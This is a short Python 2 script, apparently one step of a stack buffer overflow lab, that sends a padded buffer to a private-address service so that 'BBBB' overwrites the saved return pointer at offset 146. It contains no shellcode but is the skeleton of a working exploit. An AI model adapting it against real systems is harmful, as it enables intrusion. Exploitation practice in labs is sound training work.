#!/usr/bin/env python2
import socket

# set up the IP and port we're connecting to
RHOST = "10.0.2.15"
RPORT = 31337

# create a TCP connection (socket)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

buf_totlen = 1024
offset_srp = 146

# build a message followed by a newline
buf = ""
buf += "A"*(offset_srp - len(buf))
buf += "BBBB"
buf += "CCCC"
buf += "D"*(buf_totlen - len(buf))
buf += "\n"

# send the message
s.send(buf)
